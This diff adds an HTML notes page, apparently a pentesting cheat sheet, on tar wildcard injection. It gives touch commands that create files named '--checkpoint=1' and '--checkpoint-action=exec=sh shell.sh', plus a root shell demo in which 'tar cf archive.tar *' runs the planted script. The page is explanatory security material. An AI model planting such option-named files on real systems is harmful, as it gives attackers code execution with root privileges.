@@ -1,0 +1,74 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Tar</title>
+</head><body>Tar can use a checkpoint system <br/>
+<ul><li style="list-style-type: none">&nbsp;--checkpoint=&lt;number&gt; and --checkpoint-action=&lt;command&gt; where checkpoint corresponds to a specific number of files that should be handled by tar before performing the action</li>
+<li style="list-style-type: none">if you cannot edit the tar command, you can create files on the system for wildcard injection</li>
+<li style="list-style-type: none">touch "-checkpoint-action=exec=sh rshell.sh"</li>
+<li style="list-style-type: none">touch "-checkpoint=1"</li>
+</ul>
+<br/>
+<br/>
+Let's check tar manual page (man tar):<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; --checkpoint[=NUMBER]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; display progress messages every NUMBERth record (default 10)<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;--checkpoint-action=ACTION<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; execute ACTION on each checkpoint<br/>
+<br/>
+There is '--checkpoint-action' option, that will specify program which will<br/>
+be executed when checkpoint is reached. Basically, that allows us arbitrary<br/>
+command execution.<br/>
+<br/>
+Check the following directory:<br/>
+<br/>
+[root@defensecode public]# ls -al<br/>
+total 72<br/>
+drwxrwxrwx. &nbsp;2 user user &nbsp;4096 Oct 28 19:34 .<br/>
+drwx------. 24 user user &nbsp;4096 Oct 28 18:32 ..<br/>
+-rw-rw-r--. &nbsp;1 user user 20480 Oct 28 19:13 admin.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; &nbsp;34 Oct 28 17:47 ado.php<br/>
+-rw-r--r--. &nbsp;1 leon leon &nbsp; &nbsp; 0 Oct 28 19:19 --checkpoint=1<br/>
+-rw-r--r--. &nbsp;1 leon leon &nbsp; &nbsp; 0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; 187 Oct 28 17:44 db.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; 201 Oct 28 17:43 download.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; &nbsp;43 Oct 28 17:35 file1.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; &nbsp;56 Oct 28 17:47 footer.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; 357 Oct 28 17:36 global.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; 225 Oct 28 17:37 header.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; 117 Oct 28 17:36 inc.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; 111 Oct 28 17:38 index.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; &nbsp;94 Oct 28 17:38 script.php<br/>
+-rwxr-xr-x. &nbsp;1 leon leon &nbsp; &nbsp;12 Oct 28 19:17 shell.sh<br/>
+<br/>
+Now, for example, root user wants to create archive of all files in current <br/>
+directory.<br/>
+<br/>
+[root@defensecode public]# tar cf archive.tar *<br/>
+<br/>
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023<br/>
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023<br/>
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023<br/>
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023<br/>
+<br/>
+Boom! What happened? /usr/bin/id command gets executed! We've just achieved arbitrary command<br/>
+execution under root privileges.<br/>
+Once again, there are few files created by user 'leon'. <br/>
+<br/>
+-rw-r--r--. &nbsp;1 leon leon &nbsp; &nbsp; 0 Oct 28 19:19 --checkpoint=1<br/>
+-rw-r--r--. &nbsp;1 leon leon &nbsp; &nbsp; 0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh<br/>
+-rwxr-xr-x. &nbsp;1 leon leon &nbsp; &nbsp;12 Oct 28 19:17 shell.sh<br/>
+<br/>
+Options '--checkpoint=1' and '--checkpoint-action=exec=sh shell.sh' are passed to the <br/>
+'tar' program as command line options. Basically, they command tar to execute shell.sh<br/>
+shell script upon the execution.<br/>
+<br/>
+[root@defensecode public]# cat shell.sh<br/>
+/usr/bin/id<br/>
+<br/>
+So, with this tar argument pollution, we can basically execute arbitrary commands <br/>
+with privileges of the user that runs tar. As demonstrated on the 'root' account above.<br/>
+</body></html>
